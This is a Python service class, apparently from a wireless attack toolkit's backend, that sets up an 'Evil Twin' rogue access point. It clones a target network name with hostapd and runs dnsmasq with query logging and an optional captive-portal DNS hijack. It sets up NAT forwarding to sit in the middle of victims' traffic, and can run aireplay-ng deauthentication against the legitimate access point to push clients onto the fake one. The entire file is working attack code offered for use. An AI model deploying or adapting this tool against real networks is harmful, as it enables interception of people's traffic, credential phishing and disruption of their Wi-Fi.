"""Enhanced Evil Twin AP service with deauth support."""
import uuid, asyncio, logging
from typing import Optional
from app.config import settings
from app.models.schemas import EvilTwinRequest
from app.utils.process_manager import process_manager
logger = logging.getLogger(__name__)

class EvilTwinService:
    def __init__(self):
        self._active_twin: Optional[dict] = None

    async def start(self, req: EvilTwinRequest) -> dict:
        twin_id = str(uuid.uuid4())[:8]
        hostapd_conf = settings.HOSTAPD_DIR / f"eviltwin_{twin_id}.conf"
        with open(hostapd_conf, "w") as f:
            f.write(f"interface={req.interface}\ndriver=nl80211\nssid={req.target_essid}\nhw_mode=g\nchannel={req.channel}\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=0\n")

        await process_manager.run_sync(["ip", "addr", "flush", "dev", req.interface], timeout=5)
        await process_manager.run_sync(["ip", "addr", "add", "10.0.0.1/24", "dev", req.interface], timeout=5)
        await process_manager.run_sync(["ip", "link", "set", req.interface, "up"], timeout=5)

        dnsmasq_conf = settings.HOSTAPD_DIR / f"dnsmasq_{twin_id}.conf"
        dns_content = f"interface={req.interface}\ndhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlog-facility={settings.LOGS_DIR}/dnsmasq_{twin_id}.log\n"
        if req.captive_portal:
            dns_content += "address=/#/10.0.0.1\n"
        with open(dnsmasq_conf, "w") as f:
            f.write(dns_content)

        if req.internet_interface:
            await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5)
            await process_manager.run_sync(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", req.internet_interface, "-j", "MASQUERADE"], timeout=5)
            await process_manager.run_sync(["iptables", "-A", "FORWARD", "-i", req.interface, "-o", req.internet_interface, "-j", "ACCEPT"], timeout=5)

        asyncio.create_task(process_manager.run(["dnsmasq", "-C", str(dnsmasq_conf), "-d"], timeout=None))
        asyncio.create_task(process_manager.run(["hostapd", str(hostapd_conf)], timeout=None))

        # Optional: deauth legitimate AP to force clients to us
        if req.deauth_legitimate and req.deauth_interface and req.deauth_bssid:
            asyncio.create_task(process_manager.run([
                "aireplay-ng", "--deauth", str(req.deauth_packets),
                "-a", req.deauth_bssid, req.deauth_interface,
            ], timeout=60))

        self._active_twin = {
            "id": twin_id, "essid": req.target_essid, "channel": req.channel,
            "interface": req.interface, "ip": "10.0.0.1", "dhcp_range": "10.0.0.10-100",
            "internet_forwarding": req.internet_interface is not None,
            "captive_portal": req.captive_portal, "deauth_active": req.deauth_legitimate,
        }
        return self._active_twin

    async def stop(self) -> dict:
        results = []
        for proc in ["hostapd", "dnsmasq"]:
            _, _, rc = await process_manager.run_sync(["pkill", "-f", proc], timeout=5)
            results.append({"process": proc, "killed": rc == 0})
        await process_manager.run_sync(["iptables", "-t", "nat", "-F"], timeout=5)
        await process_manager.run_sync(["iptables", "-F", "FORWARD"], timeout=5)
        await process_manager.run_sync(["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5)
        twin = self._active_twin
        self._active_twin = None
        return {"stopped": True, "twin": twin, "cleanup": results}

    def status(self) -> dict:
        return {"active": self._active_twin is not None, "twin": self._active_twin}

evil_twin_service = EvilTwinService()
